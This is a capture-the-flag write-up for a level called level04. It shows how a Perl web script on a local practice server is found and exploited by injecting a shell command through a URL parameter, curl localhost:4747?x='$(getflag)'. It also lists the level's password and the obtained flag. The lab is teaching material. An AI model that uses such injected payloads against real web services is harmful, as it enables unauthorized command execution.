# level04

## Vulnerability: Unchecked input leading to code injection

level04's password: `qi0maab88jeaj46qoumi7maus`

we got some intel from level00:

```shell
dr-xr-x---  2 flag04 level04  33 Mar 12  2016 level04
/var/www/level04
/rofs/var/www/level04
```

1. examinate existing files and permissions

```shell
ls -la
cat level04.pl
```

seems to indicate that a server is running on localhost:4747, and that the server is running as flag04

2. search for an apache webserver and examine it

```shell
service apache2 status
cat /etc/apache2/sites-enabled/level05.conf
cat /var/www/level04/level04.pl
```

shows that the root of the webserv is containing level04.pl and that the process is running as flag04

4. test the webserver for command injection

```shell
curl localhost:4747?x=exploit
```

prints `exploit` in terminal, meaning that we might inject some code

5. inject some code to pwn the flag

```shell
curl localhost:4747?x='$(getflag)'
```

gives flag: `ne2searoevaevoem4ov4ar8ap`
